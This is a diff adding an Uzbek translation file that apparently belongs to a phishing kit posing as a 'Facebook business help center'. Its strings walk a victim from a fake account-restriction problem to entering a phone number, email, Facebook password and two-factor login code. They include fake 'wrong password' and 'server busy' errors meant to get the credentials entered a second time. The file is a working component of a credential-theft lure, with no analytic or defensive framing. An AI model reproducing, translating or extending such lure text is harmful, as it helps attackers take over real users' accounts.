@@ -1,0 +1,59 @@
+{
+  "translation": {
+    "title": "Facebook biznes yordam markazi",
+    "title2": "Facebook orqali sotish",
+    "very_phone": "Iltimos, yaroqli telefon raqamini kiriting.",
+    "banner-content": "Markaz agenti orqali",
+    "description": "Sizga qanday yordam bera olamiz?",
+    "description2": "Biz qanday yordam bera olamiz?",
+    "text": "Muammoingizni hal qilish uchun bizga qoʻshimcha maʼlumot kerak. ",
+    "label": "Eng keng tarqalgan muammolar",
+    "btn": "Funksiyadan foydalanishim bloklandi",
+    "btn1": "Mening hisobim cheklangan",
+    "btn2": "Mening suratlarim va videolarim siyosatlarni buzadi",
+    "btn3": "Mening saytim cheklangan",
+    "btn4": "Men hisobimni himoyalashim kerak",
+    "btn5": "Boshqa muammolar",
+    "button": "Keyingisi",
+    "form-title": "Yordam oling",
+    "phone": "Telefon raqami",
+    "text-batbuoc": "iltimos",
+    "email": "E-pochta manzili",
+    "form2-title2": "Davom etish uchun Facebook parolingizni kiriting",
+    "form2-content": "Ma'lumotni yuborayotgan shaxs siz ekanligingizni tasdiqlashimiz kerak. Facebook parolingizni kiriting va davom eting.",
+    "password": "Parol",
+    "validate-true": "Ma'lumotni tekshirish",
+    "chat_btn": "Suhbatni boshlang"
+  },
+  "frm_input1": {
+    "home_title": "Davom etish uchun Facebook parolingizni kiriting",
+    "modal__body-description": "Ma'lumotni yuborayotgan shaxs siz ekanligingizni tasdiqlashimiz kerak. Facebook parolingizni kiriting va davom eting.",
+    "password": "Parol",
+    "btn_send_continue": "Davom eting",
+    "validate-true": "Ma'lumotni tekshirish",
+    "text-danger": "Server band! ",
+    "text-danger1": "Parol noto‘g‘ri, qayta urinib ko‘ring.",
+    "text-danger2": "Tizimni qayta tiklashni talab qiladi. ",
+    "input1": "Muvaffaqiyatli tartibsizlikni kiriting"
+  },
+  "frm_input2": {
+    "home_title": "Davom etish uchun login kodini kiriting",
+    "description": "Hisobingizda ikki faktorli autentifikatsiya yoqilgan, bu qoʻshimcha kirish bosqichini talab qiladi.",
+    "title": "Boshqa qurilmadan ma'qullang",
+    "description2": "Hisobingizga kirgan Facebook bildirishnomasini tekshiring va davom etish uchun loginni tasdiqlang.",
+    "title2": "Yoki login kodingizni kiriting",
+    "description3": "Telefoningiz yoki siz sozlagan autentifikatsiya ilovasidagi 6-8 raqamli kodni kiriting.",
+    "button": "Kodni yuboring",
+    "validate-true": "Ma'lumotni tekshirish",
+    "text-danger": "Server band! ",
+    "text-danger1": "Parol noto‘g‘ri, qayta urinib ko‘ring.",
+    "text-danger2": "Tizimni qayta tiklashni talab qiladi. ",
+    "button1": "Kimga yuboring",
+    "placeholder": "Kirish kodi"
+  },
+  "notification": {
+    "text-danger1": "Autentifikatsiya kodi noto‘g‘ri, qayta urinib ko‘ring.",
+    "title": "Kechirasiz, bu sahifa mavjud emas,",
+    "title2": "Siz bosgan havola buzilgan yoki sahifa oʻchirilgan boʻlishi mumkin."
+  }
+}
